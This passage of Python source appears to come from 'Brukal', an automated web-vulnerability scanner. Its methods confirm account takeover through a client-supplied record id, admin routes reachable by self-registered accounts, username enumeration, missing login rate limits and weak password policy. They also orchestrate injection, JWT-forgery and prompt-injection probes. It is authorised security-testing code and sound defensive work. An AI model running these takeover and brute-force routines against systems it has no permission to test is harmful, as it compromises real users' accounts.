            body[field] = {"password": weak, "confirm": weak,
                           "email": f"{user}@example.invalid", "username": user,
                           "name": f"Brukal {tag}"}.get(role, user)
        with self._separate_identity():
            try:
                _d, r = self.browser.run(WebAction(
                    "request", url=form.action, method="POST", body=urlencode(body),
                    headers={"Content-Type": "application/x-www-form-urlencoded"}))
            except Exception:
                return False
            if r is None or (r.status or 0) >= 400:
                return False
            # The proof is a usable account, not a 200: an app may accept the form and
            # reject the password silently.
            login_url = self._login_endpoint()
            if not login_url or not self.login(login_url, user, weak):
                return False
        self.findings.add(Finding(
            title="No server-side password complexity policy",
            severity="medium", category="auth",
            target=form.action, param="", confirmed=True,
            evidence=(f"an account was created through the public signup form with the "
                      f"password {weak!r} and then authenticated with it, so the server "
                      f"enforces no minimum length or composition at all"),
            source=(f"POST {form.action} with a one-character password, then log in "
                    f"as {user}")))
        self.note("[confirm] the server accepts a one-character password")
        return True

    def recovery_endpoints(self, limit: int = 2):
        """(url, field) for password-recovery forms the crawl found. Read from the
        surface so an app that calls it something else is still covered."""
        surface = getattr(self, "surface", None)
        out = []
        rx = re.compile(r"forgot|recover|reset|lost.?pass", re.I)
        for form in (getattr(surface, "forms", []) or []):
            action = getattr(form, "action", "") or ""
            if (getattr(form, "method", "") or "").upper() != "POST" or not rx.search(action):
                continue
            names = [n for n, _t in (getattr(form, "inputs", []) or [])]
            ident = next((n for n in names
                          if re.search(r"login|user|email|account", n, re.I)), "")
            if ident:
                out.append((action, ident))
                if len(out) >= limit:
                    break
        return out

    def reset_token_targets(self):
        """(reset_url, id_param, token_param) for every crawled endpoint that takes an
        identity AND a token. Read from the surface's own parameter map, so it finds the
        endpoint whatever the application chose to call it."""
        surface = getattr(self, "surface", None)
        out = []
        id_rx = re.compile(r"^(?:login|user(?:name)?|email|account|id)$", re.I)
        token_rx = re.compile(r"tok(?:en)?|key|code|nonce|hash|sig", re.I)
        for base, params in sorted((getattr(surface, "params", {}) or {}).items()):
            names = list(params or [])
            ident = next((p for p in names if id_rx.search(p)), "")
            token = next((p for p in names if token_rx.search(p)), "")
            if ident and token:
                out.append((base, ident, token))
        return out

    def confirm_privileged_route_via_signup(self, url: str) -> bool:
        """An administrative endpoint reachable by an account anyone can create
        (OWASP API5, broken function-level authorization).

        Three observations, and all three are needed. ANONYMOUS must be refused — if a
        stranger already gets in, this is unauthenticated exposure and a different
        finding that Brukal already makes. A FRESH SELF-REGISTERED account must be
        allowed — an account created through the public form seconds ago holds exactly
        the privilege the application grants strangers. And the body must actually carry
        something, because a 200 rendering an empty shell or a redirect chase is not
        disclosure.

        Using a self-registered account rather than the operator's is the whole
        soundness argument: operator credentials may belong to an administrator, in
        which case reaching an admin page is correct behaviour and reporting it is a
        false positive."""
        from .findings import Finding
        from .web import WebAction
        if self.browser is None or not url:
            return False
        with self._separate_identity():
            try:
                _d, anon = self.browser.run(WebAction("request", url=url, method="GET"))
            except Exception:
                return False
            if anon is None or anon.status is None:
                return False
            # A stranger already reads it -> that is unauthenticated exposure, a
            # different finding. Judged by the app's own baselines when calibrated.
            _profile = getattr(self, "profile", None)
            _anon_reads = (_profile.is_substantive(anon) if _profile is not None else None)
            if _anon_reads is None:
                _anon_reads = anon.status == 200 and len(anon.body or "") > 200
            if _anon_reads and not self._refused(anon, anon.body or ""):
                return False
            made = self._register_account()
            if not made:
                return False
            user, password = made
            # Plenty of signups log you straight in. When registration already handed
            # back a session there is nothing to authenticate, and insisting on a login
            # step would fail the check on exactly the apps that are easiest to abuse.
            if not (getattr(self.browser, "_cookies", {}) or {}):
                login_url = self._login_endpoint()
                if not login_url or not self.login(login_url, user, password):
                    return False
            try:
                _d2, mine = self.browser.run(WebAction("request", url=url, method="GET"))
            except Exception:
                return False
        if mine is None or mine.status != 200 or len(mine.body or "") <= 200:
            return False
        self.findings.add(Finding(
            title="Administrative endpoint reachable by a self-registered account",
            severity="critical", category="api",
            target=url, param="", confirmed=True,
            evidence=(f"anonymous was refused (HTTP {anon.status}) while an account "
                      f"created seconds earlier through the public signup form read "
                      f"{len(mine.body or '')} bytes from it (HTTP 200) — the only "
                      f"access check on this endpoint is that SOMEBODY is logged in, "
                      f"not that they are entitled to it"),
            source=(f"GET {url} anonymously, then register {user} via the app's own "
                    f"signup form, authenticate, and GET {url} again")))
        self.note(f"[confirm] self-registered account reaches {url}")
        return True

    def profile_edit_targets(self, limit: int = 3):
        """Forms that write a credential to a record the CLIENT names.

        The dangerous shape is a profile editor whose victim is chosen by a body field:
        `POST /app/useredit` with `id`, `password`, `cpassword`. Every authorization
        prover Brukal had looked for the identifier in the PATH — `/users/{name}` — so a
        form that carries it in the body was invisible to all of them, and it is the more
        common arrangement on a server-rendered application. Returns
        (action, fields, id_field, pass_field, confirm_field)."""
        surface = getattr(self, "surface", None)
        out = []
        for form in (getattr(surface, "forms", []) or []):
            if (getattr(form, "method", "") or "").upper() != "POST":
                continue
            fields = list(getattr(form, "inputs", []) or [])
            names = [n for n, _t in fields]
            id_field = next((n for n in names if self._ID_FIELD_RE.search(n)), "")
            pass_field = confirm_field = ""
            for n, t in fields:
                role = ""
                for rname, rx in self._FIELD_ROLES:
                    if rx.search(n):
                        role = rname
                        break
                if not role and (t or "").lower() == "password":
                    role = "password"
                if role == "password" and not pass_field:
                    pass_field = n
                elif role == "confirm" and not confirm_field:
                    confirm_field = n
            if id_field and pass_field:
                out.append((form.action, fields, id_field, pass_field, confirm_field))
                if len(out) >= limit:
                    break
        return out

    def confirm_horizontal_takeover_via_form(self, edit_url, fields, id_field,
                                             pass_field, confirm_field="") -> bool:
        """Horizontal account takeover through a form that names its victim in the BODY.

        The write Brukal could not see. `confirm_bfla_password_takeover` proves this
        already, but only where the victim sits in a templated path and a bearer token
        carries the session — so on a server-rendered app it never even looked. DVNA's
        handler is `db.User.find({where:{'id': req.body.id}})` followed by a password
        write, with no ownership check anywhere.

        Both principals are accounts BRUKAL CREATES, seconds apart, through the public
        signup form. That matters twice over: no real user's credential is touched, and
        the victim's row id is READ from its own edit page rather than guessed, so the
        proof never depends on a lucky number.

        The proof is a login, not a status code — a 200 says the server accepted the
        request, not that the credential moved. Control first: the password we are about
        to set must not ALREADY authenticate the victim, or the 'proof' is a
        coincidence. Writes, so allow_intrusive gates it, and it is irreversible by
        nature: the victim's original password is not knowable. That is exactly why it
        is gated."""
        from urllib.parse import urlencode

        from .findings import Finding
        from .web import WebAction
        if self.browser is None or not self.allow_intrusive or not edit_url:
            return False
        new_password = "Brukal-Takeover-Pr00f!"

        def submit(body: dict):
            return self.browser.run(WebAction(
                "request", url=edit_url, method="POST", body=urlencode(body),
                headers={"Content-Type": "application/x-www-form-urlencoded"}))[1]

        with self._separate_identity():
            victim = self._register_account()
            if not victim:
                return False
            vuser, vpass = victim
            # The victim's own edit page renders its row id into the form. Reading it is
            # what makes this deterministic rather than a guess at a sequence.
            try:
                _d, page = self.browser.run(WebAction("request", url=edit_url,
                                                      method="GET"))
            except Exception:
                return False
            vid = ""
            for tag in re.finditer(r"<input\b[^>]*>", (getattr(page, "body", "") or ""),
                                   re.I):
                t = tag.group(0)
                nm = re.search(r'name=["\']([^"\']+)["\']', t, re.I)
                vl = re.search(r'value=["\']([^"\']*)["\']', t, re.I)
                if nm and vl and nm.group(1) == id_field and vl.group(1).strip():
                    vid = vl.group(1).strip()
                    break
            if not vid:
                return False

        # Control: the password we intend to set must not already work for the victim.
        with self._separate_identity():
            login_url = self._login_endpoint()
            if not login_url or self.login(login_url, vuser, new_password):
                return False

        with self._separate_identity():
            attacker = self._register_account()
            if not attacker:
                return False
            auser, _apass = attacker
            body = {}
            for n, t in fields:
                if (t or "").lower() in ("submit", "file"):
                    continue
                body[n] = "brukal"
            body[id_field] = vid
            body[pass_field] = new_password
            if confirm_field:
                body[confirm_field] = new_password
            try:
                submit(body)
            except Exception:
                return False

        # Proof: a session issued FOR THE VICTIM, using a password the attacker chose.
        with self._separate_identity():
            if not self.login(self._login_endpoint() or "", vuser, new_password):
                return False

        self.findings.add(Finding(
            title="Horizontal account takeover via client-supplied record id",
            severity="critical", category="api",
            target=edit_url, param=id_field, confirmed=True,
            evidence=(f"account {auser!r} set the password of account {vuser!r} "
                      f"(row {id_field}={vid}) by naming it in the request body, and "
                      f"the victim's credentials then authenticated with the value the "
                      f"attacker chose — the same password did NOT authenticate before "
                      f"the write, so the change is what moved it"),
            source=(f"register two accounts via the public signup form; as {auser}, "
                    f"POST {edit_url} with {id_field}={vid} and a chosen "
                    f"{pass_field}; then log in as {vuser} with it")))
        self.note(f"[confirm] horizontal account takeover via {edit_url} ({id_field})")
        return True

    def privileged_route_targets(self, limit: int = 4):
        """Absolute URLs from the crawl that NAME themselves as administrative.

        Deliberately a name heuristic and deliberately harmless: the worst a wrong guess
        costs is a differential that declines to fire. The proof is the three-way
        comparison in the confirmer, never the fact that a path contains 'admin'."""
        surface = getattr(self, "surface", None)
        seen, out = set(), []
        # Pages the crawl actually FETCHED come first; mined routes are guesses and go
        # after. The miner recovers route fragments from text and JS and loses whatever
        # prefix the app mounts them under: DVNA's admin API is /app/admin/usersapi and
        # was mined as /admin/usersapi, which 404s. Four probes were spent on paths that
        # do not exist while /app/admin/users — crawled, 200, and privileged — sat in
        # the page map unexamined, so the class reported nothing and looked clean.
        candidates = [p for p in (getattr(surface, "pages", {}) or {})]
        candidates += list(getattr(surface, "api_routes", []) or [])
        for route in candidates:
            if not route or not self._PRIVILEGED_RE.search(route):
                continue
            url = self._absolute_route(route)
            if not url or url in seen or self._is_irreversible_path(url):
                continue
            seen.add(url)
            out.append(url)
            if len(out) >= limit:
                break
        return out

    def confirm_user_enumeration(self, login_url: str, known_user: str,
                                 user_field: str = "username",
                                 pass_field: str = "password") -> bool:
        """The login tells a stranger which usernames exist (OWASP API2).

        Differential and read-only: the SAME wrong password is sent for an account we
        know exists and for one that cannot. If the answers differ, the endpoint is an
        oracle. Comparing against a known-good account is what makes this sound — a
        single request cannot distinguish "no such user" from "wrong password"."""
        from .findings import Finding
        from .web import WebAction
        if self.browser is None or not known_user:
            return False
        import uuid as _uuid
        absent = f"brukal-absent-{_uuid.uuid4().hex[:10]}"
        wrong = "Brukal-Wrong-Pw-000"

        def attempt(user: str):
            _d, r = self.browser.run(WebAction(
                "request", url=login_url, method="POST",
                body=json.dumps({user_field: user, pass_field: wrong}),
                headers={"Content-Type": "application/json"}))
            return r

        real, fake = attempt(known_user), attempt(absent)
        if real is None or fake is None:
            return False
        # A successful login means the "wrong" password was not wrong, and the two
        # answers are no longer comparable. Detect that by whether a SESSION was
        # issued, not by the status code: plenty of APIs answer a failed login with
        # HTTP 200 and a message in the body, and treating 200 as success made this
        # check silently skip every one of them.
        if _issued_session(real.body) or _issued_session(fake.body):
            return False
        rb, fb = (real.body or "")[:400], (fake.body or "")[:400]
        if (real.status == fake.status
                and _norm_body(rb, known_user) == _norm_body(fb, absent)):
            return False                       # indistinguishable: the correct behaviour
        self.findings.add(Finding(
            title="Username enumeration via login response",
            severity="medium", category="api",
            target=login_url, param=user_field, confirmed=True,
            evidence=(f"an existing account answered HTTP {real.status} "
                      f"{_norm_body(rb, known_user)[:90]!r}; a non-existent one answered "
                      f"HTTP {fake.status} {_norm_body(fb, absent)[:90]!r} — same password"),
            source=(f"POST {login_url} with {user_field}={known_user} vs "
                    f"{user_field}={absent}, identical wrong password")))
        return True

    def confirm_missing_rate_limit(self, login_url: str, known_user: str,
                                   attempts: int = 8,
                                   user_field: str = "username",
                                   pass_field: str = "password") -> bool:
        """Credential brute-force is unthrottled (OWASP API4).

        Deliberately gated behind allow_intrusive. Repeated failed logins are not
        read-only in effect: on a target with lockout they can DENY SERVICE to a real
        account, which is the one outcome a governed tool must never cause by accident.
        The proof is that every attempt was answered normally — no 429, no lockout
        message, no widening delay."""
        from .findings import Finding
        from .web import WebAction
        if self.browser is None or not self.allow_intrusive or not known_user:
            return False
        statuses, first_body = [], ""
        for i in range(max(2, attempts)):
            _d, r = self.browser.run(WebAction(
                "request", url=login_url, method="POST",
                body=json.dumps({user_field: known_user,
                                 pass_field: f"Brukal-Wrong-{i}"}),
                headers={"Content-Type": "application/json"}))
            if r is None:
                return False                   # a blocked request is not evidence
            statuses.append(r.status)
            first_body = first_body or (r.body or "")
            if r.status in (429, 423) or re.search(
                    r"(?i)too many|rate.?limit|locked|throttl", (r.body or "")[:400]):
                return False                   # it DOES throttle — no finding
        if len(set(statuses)) != 1:
            return False                       # behaviour changed; not a clean negative
        self.findings.add(Finding(
            title="No rate limiting on authentication",
            severity="medium", category="api",
            target=login_url, param=pass_field, confirmed=True,
            evidence=(f"{len(statuses)} consecutive failed logins for '{known_user}' all "
                      f"answered HTTP {statuses[0]} with no 429, lockout or throttling"),
            source=f"POST {login_url} x{len(statuses)} with deliberately wrong passwords"))
        return True

    def bfla_targets(self):
        """(change_url_template, login_url, victim) for the BFLA proof, or None.

        Needs a templated state-changing route, somewhere to log in, and a principal who
        is NOT us — the point is acting on somebody else's object, so proving it against
        our own account proves nothing. The victim is read from the app's own user
        listing rather than guessed, which is the same trick `confirm_bola_from_
        collection` uses: an API that lists its principals has already disclosed the map."""
        surface = getattr(self, "surface", None)
        if surface is None or not self.has_session():
            return None
        routes = list(getattr(surface, "api_routes", []) or [])
        if not routes:
            return None
        from urllib.parse import urljoin as _urljoin
        base = getattr(surface, "seed", "") or f"http://{self.target}/"

        def absolute(r):
            return r if r.startswith("http") else _urljoin(base, r)

        # Prefer the app's own contract. A spec that declares `PUT /users/{u}/password`
        # says outright "this mutates a resource addressed by whose it is" — which is
        # the definition of the surface BFLA lives on. The name heuristic below only
        # ever matched routes literally ending in 'password': it finds VAmPI and misses
        # every application that calls the same operation something else.
        # RANK, don't just take the first. The spec lists every templated write, and
        # `PUT /users/{u}/email` sorts before `PUT /users/{u}/password` in VAmPI's own
        # document — taking the head aimed a password-takeover proof at the email
        # endpoint and lost a critical finding that had already been confirmed live.
        # Credential-shaped operations first, any other templated write after.
        writes = [(m, p) for m, p in (getattr(surface, "write_operations", []) or [])
                  if m in ("PUT", "PATCH") and "{" in p]
        _CRED = ("password", "passwd", "credential", "secret", "pwd")
        change = next((absolute(p) for _m, p in writes
                       if any(w in p.lower() for w in _CRED)), None)
        if change is None and writes:
            change = absolute(writes[0][1])
        if change is None:
            change = next((absolute(r) for r in routes
                           if "{" in r and r.lower().rstrip("/").endswith("password")),
                          None)
        login = next((absolute(r) for r in routes
                      if "{" not in r and "login" in r.lower()), None)
        if not (change and login):
            return None
        victim = self._other_principal(routes, base)
        return (change, login, victim) if victim else None

    def _covered(self, klass: str, probes: int = 1, note: str = "") -> None:
        """Record that a vulnerability class was exercised. Counts probes, not findings:
        the useful statement to a reader is 'asked 14 times, nothing answered', which is
        evidence of absence in a way that silence is not."""
        entry = self.coverage.setdefault(klass, {"probes": 0, "note": ""})
        entry["probes"] += max(0, int(probes))
        if note and not entry["note"]:
            entry["note"] = note

    # A differential check -> the vulnerability class it settles, so a False result can be
    # recorded as a NEGATIVE for that class (roadmap §2.1). Names are the confirm_* methods
    # the surface sweep runs; classes match _COVERAGE_WORDS so the ledgers stay aligned.
    _CHECK_CLASS = {
        "confirm_sqli": "SQL injection", "confirm_sqli_error": "SQL injection",
        "confirm_cmdi": "Command injection", "confirm_lfi": "Path traversal / LFI",
        "confirm_ssti": "Template injection", "confirm_xss": "Cross-site scripting",
        "confirm_ssrf": "SSRF", "confirm_open_redirect": "Open redirect",
        "confirm_idor": "Object-level authz (BOLA)",
    }

    def _record_ruled_out(self, check_name: str, target: str, param: str,
                          method: str = "GET") -> None:
        """Shelve a REFUTED class: the differential `check_name` RAN on this target/param
        and returned False. Recorded (deduped) so the working set can tell the model the
        class is ruled out here and it does not burn budget re-proposing it — the sqlmap-
        on-login false-positive loop, generalised. Only ever called on a clean False (a
        raise is not a negative), so it honours 'a positive control before a negative'."""
        klass = self._CHECK_CLASS.get(check_name)
        if not klass:
            return
        key = (klass, target, param, method)
        if key not in self.ruled_out:
            self.ruled_out.append(key)

    def coverage_summary(self) -> list:
        """(class, probes, note, found) rows for the report, sorted for stable output."""
        found = set()
        for f in self.findings.all():
            if getattr(f, "category", "") == "logic":
                found.add("Model-proposed experiments")
            title = (getattr(f, "title", "") or "").lower()
            for klass, words in _COVERAGE_WORDS.items():
                if any(w in title for w in words):
                    found.add(klass)
        return sorted(((k, v["probes"], v["note"], k in found)
                       for k, v in self.coverage.items()), key=lambda r: r[0])

    def coverage_contradictions(self) -> list:
        """Findings whose title maps to NO coverage class — the exact shape that makes a
        report contradict itself: the finding is listed, but no coverage row flips to
        'finding' for it, so the table reads 'none found' beside a critical (the defect
        the vault recorded three times). The static test_coverage_consistency guards
        source-literal titles; this RUNTIME check catches titles built at run time (a
        model-named experiment, a composed title). Logic-category findings are represented
        by the 'Model-proposed experiments' row and are not orphans. Returns (title,
        severity, target) so the report can FLAG the contradiction instead of shipping it."""
        out, seen = [], set()
        for f in self.findings.all():
            if getattr(f, "category", "") == "logic":
                continue
            title = getattr(f, "title", "") or ""
            low = title.lower()
            if any(w in low for ws in _COVERAGE_WORDS.values() for w in ws):
                continue
            key = (title, getattr(f, "target", ""))
            if key in seen:
                continue
            seen.add(key)
            out.append((title, getattr(f, "severity", ""), getattr(f, "target", "")))
        return out

    def mass_assignment_targets(self):
        """(register_url, login_url, verify_url) for the mass-assignment proof, or None.

        The proof needs three endpoints and can only run when all three are known: where
        to create an account, where to exchange the credentials for a session, and where
        to ask the server what it thinks that account IS. Discovery is deterministic —
        matched against the routes the crawl mined, never guessed — so a target without
        self-service registration simply yields None instead of a speculative POST.

        Split out as its own method so the loop and the tests agree by construction. A
        detector the product never calls is worth nothing, and this one went unwired
        through a whole benchmark: the harness invoked it directly, so the coverage
        number looked right while the autonomous path had never once found the flaw."""
        surface = getattr(self, "surface", None)
        if surface is None:
            return None
        routes = list(getattr(surface, "api_routes", []) or [])
        if not routes:
            return None
        from urllib.parse import urljoin as _urljoin
        base = getattr(surface, "seed", "") or f"http://{self.target}/"

        def find(*words):
            for r in routes:
                if "{" in r:                       # a templated route is not an action
                    continue
                low = r.lower()
                if any(w in low for w in words):
                    return r if r.startswith("http") else _urljoin(base, r)
            return None

        register = find("register", "signup", "sign-up", "users/new")
        login = find("login", "signin", "sign-in", "authenticate")
        # Where the server states the account's own identity. /me is the convention;
        # fall back to the registration collection, which typically lists what it made.
        verify = find("/me", "whoami", "profile", "current-user") \
            or (register.rsplit("/", 1)[0] if register else None)
        if not (register and login and verify):
            return None
        return register, login, verify

    def confirm_surface(self, max_params: int = 12) -> int:
        """Autonomously confirm the web vuln classes (SQLi · cmdi · LFI · SSTI · XSS ·
        SSRF · open-redirect · IDOR) on BOTH the GET query parameters AND the POST/GET
        FORM fields the crawl discovered — turning candidates into CONFIRMED findings
        without waiting for the model. Bounded (cost) and governed (scope+scheme).
        Returns how many were confirmed."""
        if self.browser is None or self.surface is None:
            return 0
        # Breadth before depth. Nine classes on ONE endpoint costs about twenty-five
        # requests, so a flat budget bought four endpoints out of fifteen and the other
        # eleven were never touched by ANY class — which is not "probed and clean", the
        # thing the coverage table promises. Worse, WHICH four depended purely on the
        # order the loops happen to be written in: two runs against an identical DVNA
        # surface produced two criticals and none, the second having spent its budget on
        # an IDOR lead before it ever reached /app/ping.
        #
        # So the two classes that carry remote code execution and database compromise
        # get first claim on EVERY endpoint, and the rest share what is left.
        tier1 = (self.confirm_sqli, self.confirm_sqli_error, self.confirm_cmdi)
        tier2 = (self.confirm_lfi, self.confirm_ssti, self.confirm_xss,
                 self.confirm_ssrf, self.confirm_open_redirect, self.confirm_idor)
        checks = tier1 + tier2
        # Learn this application's vocabulary before judging anything by it. Cheap (a
        # handful of read-only requests), and it is what turns "is this a 401" into "is
        # this how THIS app refuses" — the difference that cost a confirmed critical on
        # a target whose refusal is a redirect to /login.
        if getattr(self, "profile", None) is None:
            try:
                self.calibrate()
            except Exception:
                self.profile = None
        # Sized from what a small application actually needs rather than from a round
        # number: DVNA presents about fifteen probeable endpoints, the top tier costs
        # roughly fourteen requests each, and 120 bought four of them. A budget below
        # what one modest target requires does not bound risk, it just decides which
        # findings are missed — and the target's own health monitor, not this number,
        # is what stops a run that is doing harm.
        self._confirm_budget = 400        # cap total governed requests for the reflex
        # Never spend the last of it on probing: the authorization, credential-recovery
        # and enumeration checks all run AFTER the sweeps and were reached only when a
        # target happened to be small. A class that never ran is silence, and this
        # report is not allowed to sell silence as a clean result.
        probe_floor = 50
        queue: list = []                  # (target, param, method, extra), probed later
        queued: set = set()
        settled: set = set()              # params a tier-1 class already confirmed
        confirmed = tried = 0
        probed: set[str] = set()          # endpoints already covered by passes 1 and 2
        confirmed_bola = [False]          # one object-authz proof per run is enough
        exposure_checked: set[str] = set()   # listings already asked anonymously

        from . import aiscan

        def enqueue(target, param, method="GET", extra=None):
            """Record an endpoint worth probing. Collecting first and probing after is
            what lets the highest-severity classes reach every endpoint before any
            endpoint gets the exhaustive treatment."""
            key = (target, param, method)
            if key not in queued:
                queued.add(key)
                queue.append((target, param, method, extra))

        def probe(target, param, method="GET", extra=None, run_checks=None):
            nonlocal confirmed
            run_checks = run_checks or checks
            probed.add(target)
            # An LLM-backed endpoint is a different attack surface: try prompt injection
            # first (the web classes rarely fire on a chat API, and the canary proof is
            # one request). JSON is the near-universal chat-API body shape.
            if aiscan.looks_like_ai_endpoint(target):
                for m in (method, "JSON") if method.upper() != "JSON" else ("JSON",):
                    try:
                        if self.confirm_prompt_injection(target, param, method=m,
                                                         extra=extra):
                            confirmed += 1
                            return
                    except Exception:
                        pass
            if run_checks is tier1:
                self._covered("SQL injection"); self._covered("Command injection")
            else:
                self._covered("Path traversal / LFI"); self._covered("Template injection")
                self._covered("Cross-site scripting"); self._covered("SSRF")
                self._covered("Open redirect")
            for check in run_checks:
                try:
                    if check(target, param, method=method, extra=extra):
                        confirmed += 1
                        settled.add((target, param, method))
                        return               # one confirmed class per param is enough
                    # ran and returned False -> a genuine negative: shelve the class for
                    # this endpoint so it is not re-proposed (roadmap §2.1).
                    self._record_ruled_out(getattr(check, "__name__", ""),
                                           target, param, method)
                except Exception:
                    pass                     # raised -> NOT a clean negative, don't record

        try:
            from urllib.parse import urljoin as _urljoin
            base_origin = getattr(self.surface, "seed", "") or f"http://{self.target}/"
            # Cheapest first. A budget or rate wall must cost the expensive
            # sweeps, not the one-request checks that carry the most signal —
            # a live run spent its whole budget on injection probes and never
            # asked the debug endpoint what it hands to a stranger.
            # 1) ENDPOINTS THE SPEC SAYS ARE PROTECTED — ask whether the app enforces its
            #    own contract. Read-only, credential-free, and deterministic: the spec
            #    names the endpoint, so there is no guessing about what ought to be shut.
            for _m, spath in list(getattr(self.surface, "protected_routes", []) or []):
                if self._confirm_budget <= 0:
                    return confirmed
                probe_path = self._PATH_PARAM_RE.sub("1", spath)   # fill {id}/{name}
                url = _urljoin(getattr(self.surface, "seed", "")
                               or f"http://{self.target}/", probe_path)
                try:
                    self._covered("Unauthenticated exposure",
                                  note="spec-declared protected routes, asked anonymously")
                    if self.confirm_unauth_access(url, spec_path=spath):
                        confirmed += 1
                        continue
                except Exception:
                    pass
                # It refused us — so it is the right place to ask whether a token we
                # could MINT would be accepted instead.
                if self.last_jwt:
                    try:
                        self._covered("JWT / token handling",
                                      note="offline key recovery, then a minted token")
                        if self.confirm_jwt_forgery(url, self.last_jwt):
                            confirmed += 1
                    except Exception:
                        pass

            # 1b) FIELD-INJECTION SINKS, HOISTED EARLY (was pass 7a2/7b/7c, run last).
            #     Object mass-assignment, SSRF and NoSQL-operator sinks fire the injection
            #     question at JSON body fields a crawl never surfaces (crAPI's
            #     `conversion_params`, `mechanic_api`, `coupon_code`) — challenges
            #     #8/#9/#10/#11/#12. Each is a handful of requests and carries the highest
            #     signal per request, so it runs BEFORE the expensive per-route/per-param
            #     sweeps: under the scope rate limit those sweeps hit the wall first and
            #     starved these to zero (2026-09-26 A/B). They depend only on the routes
            #     already resolved before confirm_surface (confirmed_routes + mined
            #     api_routes), not on the later passes, so the move is safe. Gated on
            #     allow_intrusive (an operator/write body) exactly as before.
            if self.allow_intrusive and self._confirm_budget > 0 and not self._rate_limited:
                try:
                    self._covered("Mass assignment",
                                  note="internal property written to an existing object")
                    confirmed += self.confirm_object_mass_assignment_sinks()
                except Exception:
                    pass
                try:
                    self._covered("Blind injection (out-of-band)",
                                  note="OOB callback from a URL POSTed into each sink field")
                    confirmed += self.confirm_ssrf_sinks()
                except Exception:
                    pass
                try:
                    self._covered("NoSQL injection",
                                  note="benign vs always-true operator differential")
                    self._covered("SQL injection",
                                  note="boolean differential over a JSON body param")
                    confirmed += self.confirm_nosqli_sinks()
                except Exception:
                    pass

            # 2) Hygiene: transport and browser-side controls, one request per host.
            #    Low severity by design so it can never crowd out a proven critical.
            if not self._headers_checked:
                self._headers_checked = True
                try:
                    self._covered("Transport / browser hygiene", note="one request per host")
                    self.confirm_security_headers(base_origin)
                except Exception:
                    pass

            # 2c) An interactive debugger reachable from the network. One read-only
            #    request, and the worst possible answer (a remote REPL plus the app's
            #    signing SECRET), so it belongs with the other cheap questions.
            for base_origin_ in ({base_origin} if base_origin else set()):
                if self._confirm_budget <= 0 or self._rate_limited:
                    break
                try:
                    self._covered("Debug exposure", note="framework debugger probe")
                    if self.confirm_debug_console(base_origin_):
                        confirmed += 1
                except Exception:
                    pass

            # 2b) CORS — one header-only question per host, asked of the seed. Cheap, and
            #    the answer governs whether any other site can read what this one serves.
            if not self._cors_checked:
                self._cors_checked = True
                try:
                    self._covered("Transport / browser hygiene")
                    if self.confirm_cors(base_origin):
                        confirmed += 1
                except Exception:
                    pass

            # 2d) AUTHORIZATION on a cookie-session application. Every authz check
            #     above needs a JWT and a templated route, so on a server-rendered app
            #     with a form login the whole family silently does not run — twelve
            #     classes probed on DVNA and not one of them an authorization class,
            #     while a competitor found six there. These two need neither a token
            #     nor a path parameter.
            #     Placed HERE, among the cheap checks, for the reason this file already
            #     gives: a budget or a rate wall must cost the expensive sweeps, not the
            #     few-request checks that carry the most signal. Sitting after the
            #     sweeps they never ran at all — the rate limit tripped during probing
            #     and both loops broke on their first iteration, so a CRITICAL class
            #     left no trace anywhere except an absent coverage row.
            for _url in self.privileged_route_targets():
                if self._confirm_budget <= 0 or self._rate_limited:
                    break
                self._confirm_budget -= 1
                self._covered("Function-level authz (BFLA)",
                              note="anonymous vs a freshly self-registered account")
                try:
                    if self.confirm_privileged_route_via_signup(_url):
                        confirmed += 1
                        break          # one proof of this class is enough
                except Exception:
                    pass

            # The write, not just the read: a form that names its victim in the body.
            # Gated behind allow_intrusive because it moves somebody's credential — both
            # accounts are ones Brukal creates, so nobody real is affected.
            if self.allow_intrusive:
                for _eurl, _f, _idf, _pf, _cf in self.profile_edit_targets():
                    if self._confirm_budget <= 0 or self._rate_limited:
                        break
                    self._covered("Object-level authz (BOLA)",
                                  note="two self-registered accounts; proof is a login")
                    try:
                        if self.confirm_horizontal_takeover_via_form(
                                _eurl, _f, _idf, _pf, _cf):
                            confirmed += 1
                            break
                    except Exception:
                        pass

            # 2e) AUTHENTICATION POSTURE a competitor found and Brukal had no check
            #     for: whether the session identifier survives a privilege change,
            #     whether the RECOVERY endpoint enumerates accounts (a different handler
            #     from the login, usually written with less care and reachable with no
            #     credential at all), and whether the server enforces any password
            #     policy. All read-only except the last, which is gated.
            _fix_login = self._login_endpoint()
            if (_fix_login and self.identity and getattr(self, "_login_password", "")
                    and self._confirm_budget > 0 and not self._rate_limited):
                self._covered("Session management",
                              note="identifier compared across a login")
                try:
                    if self.confirm_session_fixation(_fix_login, self.identity,
                                                     self._login_password):
                        confirmed += 1
                except Exception:
                    pass

            for _rurl, _rfield in self.recovery_endpoints():
                if self._confirm_budget <= 0 or self._rate_limited:
                    break
                self._covered("Authentication posture",
                              note="recovery endpoint, real account vs impossible one")
                try:
                    if self.confirm_recovery_enumeration(_rurl, self.identity or "",
                                                         _rfield):
                        confirmed += 1
                        break
                except Exception:
                    pass

            if self.allow_intrusive and self._confirm_budget > 0 and not self._rate_limited:
                self._covered("Password policy", note="a one-character password")
                try:
                    if self.confirm_weak_password_policy():
                        confirmed += 1
                except Exception:
                    pass

            # Shipped credentials that were never changed. This detector exists
            # BECAUSE a comparative benchmark found a critical default login Brukal had
            # walked past — and it was then never called from the autonomous path, so
            # the gap it was written to close stayed open. A detector the product does
            # not invoke is worth nothing; that has now happened twice in this file.
            _login_for_defaults = self._login_endpoint()
            if (_login_for_defaults and self.allow_intrusive
                    and self._confirm_budget > 0 and not self._rate_limited):
                self._covered("Default credentials",
                              note="documented pairs, against a wrong-password control")
                try:
                    if self.confirm_default_credentials(
                            _login_for_defaults,
                            login_type=getattr(self, "_login_type", "form") or "form"):
                        confirmed += 1
                except Exception:
                    pass

            for _rurl, _idp, _tokp in self.reset_token_targets():
                if self._confirm_budget <= 0 or self._rate_limited:
                    break
                self._covered("Credential recovery",
                              note="token recomputed from the username")
                try:
                    if self.confirm_predictable_reset_token(
                            _rurl, _idp, _tokp, self.identity or ""):
                        confirmed += 1
                        break
                except Exception:
                    pass

            # 3) GraphQL — one introspection query per candidate. A schema is the map
            #    of every operation the API exposes, so it is worth asking early.
            if not self._graphql_checked:
                self._graphql_checked = True
                for gurl in self.graphql_endpoints():
                    if self._confirm_budget <= 0 or self._rate_limited:
                        break
                    try:
                        self._covered("GraphQL", note="introspection query")
                        introspects = self.confirm_graphql_introspection(gurl)
                    except Exception:
                        continue
                    # Only a REAL endpoint answers introspection or batching; the
                    # candidate list contains conventional paths that may not exist, so
                    # probe further only where something responded like GraphQL.
                    batched = suggestions = False
                    try:
                        batched = self.confirm_graphql_batching(gurl)
                    except Exception:
                        pass
                    if introspects or batched:
